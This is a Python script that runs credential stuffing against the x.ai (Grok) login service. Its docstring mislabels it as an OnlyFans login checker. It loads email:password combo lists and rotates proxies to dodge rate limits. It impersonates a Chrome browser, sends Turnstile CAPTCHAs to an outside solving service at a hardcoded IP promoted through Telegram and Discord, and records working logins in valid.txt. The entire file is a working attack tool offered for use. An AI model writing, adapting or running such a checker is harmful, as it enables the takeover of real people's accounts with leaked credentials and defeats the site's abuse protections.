from curl_cffi import requests
from typing import Dict, Tuple, List
import time
import base64
import requests as std_requests
import os
import random
import uuid

class Grok:
    """OnlyFans login checker class"""

    BASE_URL = "https://accounts.x.ai/sign-in?redirect=grok-com&email=true"

    def __init__(self, solver_host: str = "localhost", solver_port: int = 5000, solver_api_key: str = "", proxy: str = None, proxy_file: str = None):
        self.session = requests.Session(impersonate="chrome")
        self.authenticated = False
        self.auth_token = None
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

        # Proxy config (only for Grok requests)
        self.proxy = proxy
        self.proxy_pool = []
        self.proxy_file = proxy_file

        # Load proxy pool from file if specified
        if proxy_file:
            self.load_proxy_pool(proxy_file)
        # Otherwise use single proxy if provided
        elif proxy:
            self.proxy_pool = [proxy]

        # Turnstile config
        self.TURNSTILE_SITE_KEY = "0x4AAAAAAAhr9JGVDZbrZOo0"
        self.TURNSTILE_URL = Grok.BASE_URL

        # Solver config
        self.SOLVER_HOST = solver_host
        self.SOLVER_PORT = solver_port
        self.SOLVER_API_KEY = solver_api_key

        if solver_api_key == "":
            print("="*50)
            print("Add your APIKEY (Join https://t.me/NSLSolver or https://discord.gg/DPYQZN2JK8)")
            print("="*50)
            os._exit(0)

    def load_proxy_pool(self, file_path: str):
        """Load proxies from a file into the proxy pool"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.proxy_pool.append(line)

            if self.proxy_pool:
                print(f"[INFO] Loaded {len(self.proxy_pool)} proxies from {file_path}")
            else:
                print(f"[WARNING] No proxies found in {file_path}")
        except FileNotFoundError:
            print(f"[WARNING] Proxy file not found: {file_path}. Continuing without proxies.")
        except Exception as e:
            print(f"[ERROR] Failed to load proxies: {str(e)}")

    def get_random_proxy(self) -> Dict[str, str]:
        """Get a random proxy from the pool"""
        if not self.proxy_pool:
            return None

        proxy = random.choice(self.proxy_pool)
        return {
            "http": "http://" + proxy,
            "https": "http://" + proxy
        }

    def get_solver_headers(self) -> Dict[str, str]:
        return {
            "Content-Type": "application/json",
            "X-API-Key": self.SOLVER_API_KEY
        }

    def get_token(self):

        payload = {
            "type": "turnstile",
            "site_key": self.TURNSTILE_SITE_KEY,
            "url": self.TURNSTILE_URL,
            "user_agent": self.user_agent

        }

        try:
            response = std_requests.post(
                f"http://{self.SOLVER_HOST}:{self.SOLVER_PORT}/solve",
                json=payload,
                headers=self.get_solver_headers(),
                timeout=180
            )

            data = response.json()

            if data.get("success") and data.get("token"):
                token = data.get("token")
                return token
            else:
                return None

        except:
            return None

    def login(self, email: str, password: str, turnstile_response: str = "") -> Tuple[bool, str]:
        try:

            headers = {
                'accept': '*/*',
                'accept-language': 'fr-FR,fr;q=0.6',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://accounts.x.ai',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://accounts.x.ai/sign-in?redirect=grok-com&email=true',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            json_data = {
                'rpc': 'createSession',
                'req': {
                    'createSessionRequest': {
                        'credentials': {
                            'emailAndPassword': {
                                'email': email,
                                'clearTextPassword': password,
                            },
                        },
                    },
                    'turnstileToken': turnstile_response,
                    'promptOnDuplicateEmail': False,
                },
            }

            response = requests.post(
                'https://accounts.x.ai/api/rpc',
                headers=headers,
                json=json_data,
                impersonate="chrome",
                proxies=self.get_random_proxy()
            )

            if response.status_code == 200:
                data = response.json()
                if data.get("cookieSetterUrl", "") != "":
                    self.authenticated = True
                    self.auth_token = data.get('cookieSetterUrl', "") 
                    return True, "Login successful"
                else:
                    return False, "Invalid credentials"
            elif response.status_code == 403:
                return False, "Invalid email or password"
            elif response.status_code == 429:
                return False, "Too many attempts, rate limited"
            else:
                return False, f"Login failed with status code: {response.status_code}"

        except requests.exceptions.RequestException as e:
            return False, f"Network error: {str(e)}"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def check_credentials(self, email: str, password: str) -> Dict[str, any]:
        token = self.get_token()
        success, message = self.login(email, password, token if token else "")

        return {
            "email": email,
            "valid": success,
            "message": message,
            "authenticated": self.authenticated
        }

    def logout(self) -> bool:
        self.authenticated = False
        self.auth_token = None
        self.session.cookies.clear()
        return True

    def load_combos(self, file_path: str = "combo.txt") -> List[Tuple[str, str]]:
        combos = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    if ':' in line:
                        parts = line.split(':', 1)
                        email = parts[0].strip()
                        password = parts[1].strip()
                        combos.append((email, password))
                    else:
                        pass

            print(f"[INFO] Loaded {len(combos)} combos from {file_path}")
            return combos

        except FileNotFoundError:
            print(f"[ERROR] File not found: {file_path}")
            return []
        except Exception as e:
            print(f"[ERROR] Failed to load combos: {str(e)}")
            return []

    def check_all_combos(self, file_path: str = "combo.txt", delay: float = 1.0) -> Dict[str, List[Dict]]:
        combos = self.load_combos(file_path)
        results = {
            "valid": [],
            "invalid": []
        }

        if not combos:
            return results

        print(f"\n[INFO] Starting to check {len(combos)} combos...\n")

        for i, (email, password) in enumerate(combos, 1):
            print(f"[{i}/{len(combos)}] Checking: {email}")

            result = self.check_credentials(email, password)

            if result['valid']:
                print(f"  [✓] VALID - {result['message']}")
                results['valid'].append(result)
                self.save_valid(email, password)
            else:
                print(f"  [✗] INVALID - {result['message']}")
                results['invalid'].append(result)

            # Reset session for next check
            self.logout()

            # Delay to avoid rate limiting
            if i < len(combos):
                time.sleep(delay)

        print(f"\n[SUMMARY] Checked: {len(combos)} | Valid: {len(results['valid'])} | Invalid: {len(results['invalid'])}")

        return results

    def save_valid(self, email: str, password: str, file_path: str = "valid.txt"):
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
        except Exception as e:
            pass


if __name__ == "__main__":
    checker = Grok(
        solver_host="173.249.41.237",
        solver_port=5000,
        solver_api_key="",
        proxy_file="proxies.txt"
    )

    results = checker.check_all_combos(file_path="combo.txt", delay=1.0)

    # Display results
    if results['valid']:
        print("\n" + "="*50)
        print("VALID ACCOUNTS:")
        print("="*50)
        for account in results['valid']:
            print(f"  {account['email']}")
        print(f"\nValid accounts saved to: valid.txt")
